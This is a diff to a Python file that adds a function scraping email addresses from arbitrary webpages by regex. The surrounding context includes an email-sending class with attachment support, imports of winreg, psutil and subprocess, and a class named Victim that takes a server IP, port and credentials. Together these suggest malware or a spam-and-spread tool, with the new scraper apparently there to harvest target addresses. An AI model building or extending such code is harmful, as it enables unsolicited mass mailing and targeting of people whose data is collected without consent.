@@ -1,6 +1,8 @@
+import requests
+from bs4 import BeautifulSoup
+import re
 import smtplib
 import os
-import getpass
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -12,6 +14,7 @@ import psutil
 import subprocess
 import ast
 import winreg
+
 
 class EmailSender:
     def __init__(self, smtp_server, smtp_port, username, password):
@@ -47,6 +50,31 @@ class EmailSender:
             print("Email sent successfully!")
         except smtplib.SMTPException as e:
             print("Failed to send email. Error:", str(e))
+
+
+def scrape_email_addresses(url):
+    email_addresses = []  # List to store the email addresses
+
+    # Send a GET request to the webpage
+    response = requests.get(url)
+    if response.status_code == 200:
+        # Create BeautifulSoup object to parse the HTML content
+        soup = BeautifulSoup(response.content, 'html.parser')
+
+        # Find all email addresses using regular expressions
+        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
+        found_emails = re.findall(email_pattern, soup.get_text())
+
+        # Remove duplicate email addresses and add them to the list
+        for email in found_emails:
+            if email not in email_addresses:
+                email_addresses.append(email)
+
+    else:
+        print(f"Failed to fetch webpage: {response.status_code}")
+
+    return email_addresses
+
 
 class Victim:
     def __init__(self, server_ip, server_port, email_address, password):
